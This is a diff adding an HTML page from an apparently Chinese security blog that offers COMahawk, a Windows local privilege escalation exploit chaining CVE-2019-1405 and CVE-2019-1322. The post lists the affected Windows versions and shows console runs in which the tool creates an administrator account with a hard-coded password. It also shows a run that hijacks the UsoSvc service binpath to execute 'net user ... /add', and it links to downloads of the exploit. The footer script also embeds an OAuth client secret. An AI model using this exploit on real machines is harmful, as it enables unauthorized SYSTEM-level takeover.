@@ -1,0 +1,372 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="Exp,Tool,LPE">
+
+
+<meta name="description" content="漏洞介绍
+由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVI...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322">
+            
+            Windows提权工具 CVE-2019-1405 &amp; CVE-2019-1322
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Exp/">Exp</a> <a class="category-link" href="/categories/Lpe/">提权</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/Exp/" rel="tag">Exp</a> <a class="tag-none-link" href="/tags/LPE/" rel="tag">LPE</a> <a class="tag-none-link" href="/tags/Tool/" rel="tag">Tool</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2020/01/15</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1920</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="漏洞介绍">漏洞介绍</h3>
+<p>由NCC Group研究人员所发现的两个通过COM本地服务进行非法提权的漏洞。第一个漏洞CVE-2019-1405是COM服务中的一个逻辑错误，可让本地普通用户以LOCAL SERVICE身份执行任意命令。第二个漏洞CVE-2019-1322是一个简单的服务配置错误，可让本地SERVICE组中的任何用户重新配置以SYSTEM权限运行的服务（此漏洞也被其他研究人员发现）。当以上两个漏洞结合在一起时，就允许本地普通用户以SYSTEM权限执行任意命令。</p>
+<p>全面检查了一些Windows服务,发现以LOCAL SERVICE或NETWORK SERVICE运行的所有用户都可以执行这种攻击。其中就包括前面我们提到的UPnP Device Host服务,这样我们就能以本地任意用户身份,结合使用CVE-2019-1405及CVE-2019-1322这两个漏洞,成功在Windows 10(1803到1903)系统上将权限提升至SYSTEM用户。</p>
+<h3 id="漏洞版本">漏洞版本</h3>
+<p>Vendor 	Product 	Versions<br>
+Microsoft	Windows 10	-, 1607, 1709, 1803, 1809, 1903<br>
+Microsoft	Windows 7	-<br>
+Microsoft	Windows 8.1	-<br>
+Microsoft	Windows Rt 8.1	-<br>
+Microsoft	Windows Server 2008	-, R2<br>
+Microsoft	Windows Server 2012	-, R2<br>
+Microsoft	Windows Server 2016	-, 1803, 1903<br>
+Microsoft	Windows Server 2019	-</p>
+<h3 id="默认提权">默认提权</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe</span><br><span class="line">[\] Progress:  1/9 2/9 3/9 4/9 5/9 6/9 7/9 8/9 9/9</span><br><span class="line">[+] Hopefully k8gege:K8gege520 is added as an admin.</span><br><span class="line"></span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="指定命令">指定命令</h3>
+<figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\null\Desktop&gt;COMahawk64.exe <span class="string">"net user k8gege K8gege123? /add"</span></span><br><span class="line">[+] Executing <span class="built_in">command</span> [ sc config UsoSvc binpath= <span class="string">"cmd.exe /c net user k8gege K8gege123? /add"</span> ]</span><br><span class="line">[\] Progress:  1/6 2/6 3/6 4/6 5/6 6/6</span><br><span class="line">[+] Command executed.</span><br><span class="line">C:\Users\null\Desktop&gt;net user</span><br><span class="line"></span><br><span class="line">\\DESKTOP-3F42O5D 的用户帐户</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">Administrator            DefaultAccount           Guest</span><br><span class="line">k8gege                   null                     WDAGUtilityAccount</span><br><span class="line">命令成功完成。</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="Win10提权">Win10提权</h3>
+<p>Teston Win10 X64 1803<br>
+<img data-original="http://k8gege.org/k8img/LPE/COMahawk.PNG"></p>
+<h3 id="Exp">Exp</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/apt69/COMahawk">https://github.com/apt69/COMahawk</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/K8tools/raw/master/Comahawk.rar">https://github.com/k8gege/K8tools/raw/master/Comahawk.rar</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/53177.html" class="pre-post btn btn-default" title="〖教程〗Ladon 6.2自定义密码爆破">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖教程〗Ladon 6.2自定义密码爆破</span>
+    </a>
+    
+    
+    <a href="/p/30568.html" class="next-post btn btn-default" title="利用Gh0st 3.6远程溢出漏洞反向控制攻击者">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            利用Gh0st 3.6远程溢出漏洞反向控制攻击者</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-text">漏洞介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%89%88%E6%9C%AC"><span class="toc-text">漏洞版本</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E6%8F%90%E6%9D%83"><span class="toc-text">默认提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8C%87%E5%AE%9A%E5%91%BD%E4%BB%A4"><span class="toc-text">指定命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Win10%E6%8F%90%E6%9D%83"><span class="toc-text">Win10提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp"><span class="toc-text">Exp</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
